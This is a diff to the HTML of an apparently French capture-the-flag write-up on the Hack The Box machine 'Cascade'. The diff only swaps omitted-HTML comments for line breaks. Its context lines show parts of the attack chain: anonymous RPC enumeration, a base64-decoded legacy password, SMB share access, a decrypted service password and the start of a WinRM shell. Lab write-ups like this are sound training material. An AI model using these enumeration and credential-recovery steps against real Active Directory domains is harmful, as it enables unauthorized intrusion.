@@ -254,7 +254,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap <span style="color:#66d9ef">done</span>: <span style="color:#ae81ff">1</span> IP address <span style="color:#f92672">(</span><span style="color:#ae81ff">1</span> host up<span style="color:#f92672">)</span> scanned in 541.01 seconds
            Raw packets sent: <span style="color:#ae81ff">30274</span> <span style="color:#f92672">(</span>1.336MB<span style="color:#f92672">)</span> | Rcvd: <span style="color:#ae81ff">242</span> <span style="color:#f92672">(</span>11.308KB<span style="color:#f92672">)</span>
 </code></pre></div><p>Les ports classiques d&rsquo;une machine Windows sont ouverts. Pas de ports exotiques.
-<!-- raw HTML omitted --></p>
+<br/></p>
 <h3 id="énumération-anonyme--premier-accès">Énumération anonyme &amp; premier accès</h3>
 <p>On tente premièrement de se connecter en anonyme au service RPC et d&rsquo;énumérer les utilisateurs du domaine.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ rpcclient -U <span style="color:#e6db74">&#34;&#34;</span> 10.10.10.182
@@ -448,7 +448,7 @@ cascadeLegacyPwd: clk0bjVldmE<span style="color:#f92672">=</span>
 </code></pre></div><p>La chaine de caractères associée semble être encodée en base64. Une fois décodée, on récupère ce qui semble être un premier mot de passe !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ echo <span style="color:#e6db74">&#34;clk0bjVldmE=&#34;</span> | base64 -d
 rY4n5eva%
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h3 id="partages-smb--première-escalade">Partages SMB &amp; première escalade</h3>
 <p>Disposant maintenant d&rsquo;un premier accès au domaine, on peut se tourner vers les partages SMB.
 Commençons par lister ces derniers.</p>
@@ -622,7 +622,7 @@ C:<span style="color:#ae81ff">\U</span>sers<span style="color:#ae81ff">\s</span>
 
 PS &gt; type ../Desktop/user.txt
 a0**REDACTED**
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h3 id="partage-audit-rétro-ingénierie--nouveau-compte">Partage &ldquo;Audit$&rdquo;, rétro-ingénierie &amp; nouveau compte</h3>
 <p>Disposant d&rsquo;un nouveau compte ayant des droits plus avantageux, le partage SMB <code>Audit$</code> devient accessible.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ smbclient -U <span style="color:#e6db74">&#34;s.smith&#34;</span> //10.10.10.182/Audit$
@@ -754,7 +754,7 @@ public class Program
 </code></pre></div><p>Le résultat ne se fait pas attendre !</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">Hello World
 w3lc0meFr31nd
-</code></pre></div><!-- raw HTML omitted -->
+</code></pre></div><br/>
 <h3 id="escalade-de-privilège-via-arksvc">Escalade de privilège via ArkSvc</h3>
 <p>L&rsquo;utilisateur <code>ArkSvc</code> étant également membre du groupe <code>Remote Management Users</code> on peut l&rsquo;utiliser pour se connecter via WinRM.</p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ ruby winrm_shell_arksvc.rb 
